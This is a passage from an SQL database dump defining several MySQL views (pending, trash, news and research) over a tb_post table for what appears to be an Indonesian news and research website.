CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `post_pending_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'news') and (`tb_post`.`status` = '4')) order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for post_trash_view
-- ----------------------------
DROP VIEW IF EXISTS `post_trash_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `post_trash_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'news') and (`tb_post`.`status` = '3')) order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for post_view
-- ----------------------------
DROP VIEW IF EXISTS `post_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `post_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi`,`tb_post`.`eng_post` AS `eng_post`,`tb_post`.`eng_title` AS `eng_title` from `tb_post` where (`tb_post`.`type` = 'news') order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for research_view
-- ----------------------------
DROP VIEW IF EXISTS `research_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `research_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`status` in (1,2)) and (`tb_post`.`type` = 'research')) ;

SET FOREIGN_KEY_CHECKS = 1;
